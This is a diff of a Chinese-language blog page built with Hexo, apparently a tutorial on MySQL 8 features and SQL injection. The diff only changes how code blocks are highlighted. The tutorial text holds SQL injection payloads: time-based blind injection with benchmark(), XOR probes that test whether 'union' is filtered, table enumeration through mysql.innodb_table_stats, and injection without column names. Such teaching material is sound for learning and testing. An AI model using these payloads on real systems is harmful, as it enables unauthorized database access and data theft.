@@ -29,7 +29,8 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 
@@ -420,24 +421,27 @@
 </ul>
 <p>这里我推荐使用docker 安装mysql:8.0.19</p>
 <h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>安装镜像：</p>
-<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull mysql:<span class="number">8.0</span>.<span class="number">19</span> </span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-docker"><code class="language-docker">sudo docker pull mysql<span class="token punctuation">:</span>8.0.19 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>docker run 容器:</p>
-<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="keyword">run</span><span class="bash"> --name=<span class="string">&quot;mysql8&quot;</span> -p 3360:3306 -v /my/data/mysql8/:/var/lib/mysql/ -e MYSQL_ROOT_POSSWORD=root mysql:8.0.19</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-docker"><code class="language-docker">sudo docker run <span class="token punctuation">-</span><span class="token punctuation">-</span>name=<span class="token string">"mysql8"</span> <span class="token punctuation">-</span>p 3360<span class="token punctuation">:</span>3306 <span class="token punctuation">-</span>v /my/data/mysql8/<span class="token punctuation">:</span>/var/lib/mysql/ <span class="token punctuation">-</span>e MYSQL_ROOT_POSSWORD=root mysql<span class="token punctuation">:</span>8.0.19
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>卷挂载路径：</p>
-<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/mysql/  数据存储目录</span><br><span class="line">/etc/mysql/  mysql配置目录</span><br><span class="line">/var/log/  日志存储目录</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-docker"><code class="language-docker">/var/lib/mysql/  数据存储目录
+/etc/mysql/  mysql配置目录
+/var/log/  日志存储目录
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>卷的具体挂载可自行选择</p>
 <p>启动容器</p>
-<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start mysql8</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-docker"><code class="language-docker">sudo docker start mysql8
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>进入容器</p>
-<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it mysql8 /bin/bash</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-docker"><code class="language-docker">sudo docker exec <span class="token punctuation">-</span>it mysql8 /bin/bash
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>进入mysql8</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sq"><code class="language-sq">mysql -u root -p
+root
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>安装完成</p>
 <h2 id="语句新增"><a href="#语句新增" class="headerlink" title="语句新增"></a>语句新增</h2><h3 id="table语句"><a href="#table语句" class="headerlink" title="table语句"></a>table语句</h3><ul>
 <li><p>查询语句</p>
@@ -445,8 +449,9 @@
 <p>  同之前版本的select * from 【表名】; 都可以显示表的全部信息</p>
 <p>  <img src="image-20210528173723745.png" alt="image-20210528173723745"></p>
 <p>  支持语法：</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TABLE</span> table_name [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name] [LIMIT number [<span class="keyword">OFFSET</span> number]]</span><br><span class="line">#该语句支持使用<span class="keyword">order</span> <span class="keyword">by</span> 和limit 语句进行查询</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">TABLE</span> table_name <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column_name<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> number <span class="token punctuation">[</span><span class="token keyword">OFFSET</span> number<span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true">#该语句支持使用order by 和limit 语句进行查询</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>  order by </p>
 <p>  <img src="image-20210528174058762.png" alt="image-20210528174058762"></p>
 <p>  limit 1,2</p>
@@ -455,40 +460,44 @@
 </ul>
 <h3 id="values语句"><a href="#values语句" class="headerlink" title="values语句"></a>values语句</h3><ul>
 <li><p>官方语法：</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span> row_constructor_list [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_designator] [LIMIT <span class="keyword">BY</span> number]row_constructor_list:<span class="type">ROW</span>(value_list)[, <span class="type">ROW</span>(value_list)][, ...]value_list:<span class="keyword">value</span>[, <span class="keyword">value</span>][, ...]column_designator:column_index</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">VALUES</span> row_constructor_list <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column_designator<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token keyword">BY</span> number<span class="token punctuation">]</span>row_constructor_list:<span class="token keyword">ROW</span><span class="token punctuation">(</span>value_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">ROW</span><span class="token punctuation">(</span>value_list<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>value_list:<span class="token keyword">value</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">value</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>column_designator:column_index
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
 </ul>
 <p>解析：</p>
 <ul>
 <li><p>values row()语句：</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  构造一个虚拟表，值为1，2，3 row译为行</p>
 <p>  这个语句可以构造多行数据</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="type">row</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>),<span class="type">row</span>(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  <img src="image-20210528192350589.png" alt="image-20210528192350589"></p>
 <p>  vlaues row()语句可接入多种语句中执行</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(&quot;a&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mujie; </span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> mujie<span class="token punctuation">;</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  <img src="image-20210528192733112.png" alt="image-20210528192733112"></p>
 <p>  或者：</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(&quot;a&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mujie <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">^</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>
-
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">3</span> <span class="keyword">union</span>  <span class="keyword">values</span> <span class="type">row</span>(&quot;a&quot;))a;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> mujie <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">^</span><span class="token number">2</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">3</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span> <span class="token keyword">union</span>  <span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  总的来说 values row() 语句就是提供了类似select 1,2,3 的功能，当使用values语句可以一次定义更多的虚拟数据</p>
 <p>  除了构建虚拟表，values row()语句还可以快速创建真实的表</p>
 <p>  values row()语句定义列名，需配合select 使用</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="keyword">as</span> xxx(id,username,password);</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xxx<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  <img src="image-20210528194924357.png" alt="image-20210528194924357"></p>
 <p>  配合create table 语句</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="keyword">as</span> xxx(id,username,password);</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> users
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xxx<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>  <img src="image-20210528195303944.png" alt="image-20210528195303944"></p>
 <p>  定义表的类型</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> userss (id <span class="type">int</span>,username <span class="type">char</span>,password <span class="type">char</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="keyword">as</span> xxx(id,username,password);</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> userss <span class="token punctuation">(</span>id <span class="token keyword">int</span><span class="token punctuation">,</span>username char<span class="token punctuation">,</span>password char<span class="token punctuation">)</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xxx<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>  <img src="image-20210528195846823-1622203128475.png" alt="image-20210528195846823"></p>
 <p>  以上就是mysql8在命令部分的新特性，可用于注入攻击</p>
 </li>
@@ -651,8 +660,8 @@
 </li>
 </ul>
 <h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>sql支持正则匹配</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> regexp <span class="string">&#x27;正则表达式&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token operator">regexp</span> <span class="token string">'正则表达式'</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li><p>规则：</p>
 <p>  <code>^str</code>表示匹配以str为开头的字符</p>
@@ -703,8 +712,8 @@
 </ul>
 <blockquote>
 <p><code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span>$<span class="keyword">USER</span>  host<span class="operator">=</span>$HOST;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> file_priv <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">where</span> <span class="token keyword">user</span><span class="token operator">=</span>$<span class="token keyword">USER</span>  host<span class="token operator">=</span>$HOST<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p>
 <ul>
 <li>无内容，表示无限制。</li>
@@ -713,8 +722,10 @@
 </ul>
 <p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p>
 <p>三种方法查看当前<code>secure-file-priv</code>的值：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@secure</span>_file_priv;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@global</span>.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@secure_file_priv</span><span class="token punctuation">;</span>
+<span class="token keyword">select</span> @<span class="token variable">@global.secure_file_priv</span><span class="token punctuation">;</span>
+<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"secure_file_priv"</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>修改：</p>
 <ul>
 <li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li>
@@ -770,11 +781,11 @@
 <p><strong>BENCHMARK（count,expr) 函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快，结果值总是0。</strong></p>
 <p>语法;</p>
 <p>benchmark(执行次数，执行语句)，注入时用发同sleep()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(1=1,benchmark(1000000,md5(&#x27;</span>test<span class="string">&#x27;)),0)--+</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if(1=1,benchmark(1000000,md5('</span>test'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>benchmark()函数还可以用在select查询中</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,benchmark(<span class="number">10000000000000000</span>,md5(<span class="string">&#x27;test&#x27;</span>)),<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">10000000000000000</span><span class="token punctuation">,</span>md5<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>当语句正确时benchmark执行，页面显示延时</p>
 <p>这样就巧妙的绕过了if()函数对盲注的影响</p>
 <p>当然运算符注入也可以脱离if</p>
@@ -788,10 +799,11 @@
 <blockquote>
 <p>符号：xor 或 ^<br>a ^ b 当a,b相同时返回0，不同时返回1<br>如</p>
 </blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;^ (length(&quot;union&quot;)=5)--+</span></span><br><span class="line"><span class="string">当union未被过滤返回0,过滤返回1</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">^</span> <span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+当<span class="token keyword">union</span>未被过滤返回<span class="token number">0</span><span class="token punctuation">,</span>过滤返回<span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210525155303335.png" alt="image-20210525155303335"></p>
 </li>
 <li><p>等于运算</p>
@@ -799,8 +811,8 @@
 <p>符号：= 或 like</p>
 <p>a=b时返回1，否则返回0</p>
 <p>如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-SQL"><code class="language-SQL">select * from users where id=(1=1);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210525155623553.png" alt="image-20210525155623553"></p>
 <p>注入语句：</p>
 <p><img src="image-20210525155724010.png" alt="image-20210525155724010"></p>
@@ -810,8 +822,8 @@
 <blockquote>
 <p>sql有一个特殊的不等运算符：&lt;&gt;</p>
 <p>用法同!=</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="operator">=</span>(<span class="number">1</span><span class="operator">&lt;&gt;</span><span class="number">0</span>)<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210525155923856.png" alt="image-20210525155923856"></p>
 </blockquote>
 </li>
@@ -851,7 +863,8 @@
 </blockquote>
 <blockquote>
 <p>payload:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="operator">||</span> mysql.inndb_index_starts</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token operator">||</span> mysql<span class="token punctuation">.</span>inndb_index_starts
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </blockquote>
 <ul>
 <li>performance_schema库</li>
@@ -877,35 +890,37 @@
 <ul>
 <li><p>payload举例：</p>
 <p>  当select 1,2,3;时，数据库会自动建立一个列名和数据都为123的虚拟库</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  <img src="image-20210524111601355.png" alt="image-20210524111601355"></p>
 <p>  联合查询基于这个原理，是将123写入列名下查看回显和数据</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  <img src="image-20210524111818234.png" alt="image-20210524111818234"></p>
 <p>  无列名原理恰好与此相反，是将数据写入虚拟的1,2,3,列下</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 </ul>
 <p><img src="image-20210524111959779.png" alt="image-20210524111959779"></p>
 <p>这样做，我们便从不知到列名，变成了自定义一个列名，查询这个虚拟表，就得到了数据</p>
 <h3 id="起别名查询"><a href="#起别名查询" class="headerlink" title="起别名查询"></a>起别名查询</h3><p>知道原理，我们可以明白，无列名注入的基本语句如下</p>
